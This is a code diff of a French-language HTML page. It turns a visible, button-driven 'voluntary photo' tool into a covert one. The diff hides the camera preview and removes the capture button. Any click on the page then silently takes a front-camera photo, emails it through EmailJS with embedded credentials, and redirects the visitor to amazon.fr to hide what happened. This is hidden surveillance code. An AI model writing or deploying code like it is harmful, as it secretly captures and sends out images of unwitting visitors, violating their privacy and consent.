@@ -2,44 +2,65 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>Photo volontaire</title>
+  <title>Photo unique</title>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 </head>
 <body>
-  <h2>Prendre une photo et l’envoyer</h2>
-  <video id="video" autoplay playsinline width="300"></video>
+  <video id="video" autoplay playsinline style="display:none;"></video>
   <canvas id="canvas" width="300" height="200" style="display:none;"></canvas>
-  <br>
-  <button id="capture">📸 Prendre la photo</button>
 
   <script>
-    // Initialiser EmailJS avec ton Public Key
+    // Initialiser EmailJS
     emailjs.init("IoSfbtGz4KSL_5_9E");
 
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
-    const captureButton = document.getElementById('capture');
 
-    // Demander l’accès à la caméra
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
+    async function capturePhoto() {
+      try {
+        // Accès caméra
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
-      })
-      .catch(err => console.error("Erreur caméra :", err));
 
-    // Prendre la photo au clic
-    captureButton.addEventListener('click', () => {
-      context.drawImage(video, 0, 0, canvas.width, canvas.height);
-      const imageData = canvas.toDataURL("image/png");
+        video.onloadeddata = () => {
+          // Prendre la photo
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-      emailjs.send("service_8cs0gml", "template_hxfltc", {
-        message: "Nouvelle photo volontaire 📸",
-        image: imageData
-      })
-      .then(() => alert("Photo envoyée avec succès ✅"))
-      .catch(err => console.error("Erreur EmailJS :", err));
-    });
+          // Arrêter la caméra
+          stream.getTracks().forEach(track => track.stop());
+
+          // Convertir en image compressée et envoyer
+          canvas.toBlob((blob) => {
+            const reader = new FileReader();
+            reader.onloadend = () => {
+              const imageData = reader.result;
+
+              emailjs.send("service_8cs0gml", "template_hxfltc", {
+                message: "Photo unique 📸",
+                image: imageData
+              })
+              .then(() => {
+                // Redirection après envoi
+                window.location.href = "https://www.amazon.fr";
+              })
+              .catch(err => {
+                console.error("Erreur EmailJS :", err);
+                window.location.href = "https://www.amazon.fr";
+              });
+            };
+            reader.readAsDataURL(blob);
+          }, "image/jpeg", 0.05); // Ultra compressée
+        };
+
+      } catch (err) {
+        console.error("Erreur caméra :", err);
+        window.location.href = "https://www.amazon.fr";
+      }
+    }
+
+    // Déclencher la capture dès que l'utilisateur clique sur la page
+    document.body.addEventListener('click', capturePhoto);
   </script>
 </body>
 </html>
